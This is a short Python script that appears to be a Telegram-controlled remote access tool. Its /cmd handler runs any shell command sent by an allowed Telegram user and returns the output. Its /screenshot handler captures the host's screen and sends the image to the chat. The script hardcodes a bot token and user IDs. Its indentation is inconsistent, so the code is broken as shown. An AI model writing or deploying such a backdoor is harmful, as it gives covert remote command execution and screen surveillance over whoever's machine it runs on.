import telebot, subprocess, pyscreenshot

TOKEN = "8405668689:AAFEReuiMzzh9jCXfA1aQL9LcbE5fRkTNiQ"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['cmd'])
def cmd_handler(message):
   ALLOWED_USER_IDS = [8204155559]
   if message.from_user.id not in ALLOWED_USER_IDS:
       bot.reply_to(message, "Использование запрещенно.")
       return
    command = message.text[5:]
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = process.communicate()
        result = output.decode('utf-8') + "\n" + error.decode('utf-8')
        bot.reply_to(message, result)
    except Exception as e:
        bot.reply_to(message, str(e))

@bot.message_handler(commands=['screenshot'])
def screenshot_handler(message):
   ALLOWED_USER_IDS = [123456789, 987654321]
   if message.from_user.id not in ALLOWED_USER_IDS:
       bot.reply_to(message, "Использование запрещенно")
       return
    pyscreenshot.grab().save("screenshot.png")
    with open("screenshot.png", "rb") as photo:
        bot.send_photo(message.chat.id, photo)

bot.infinity_polling()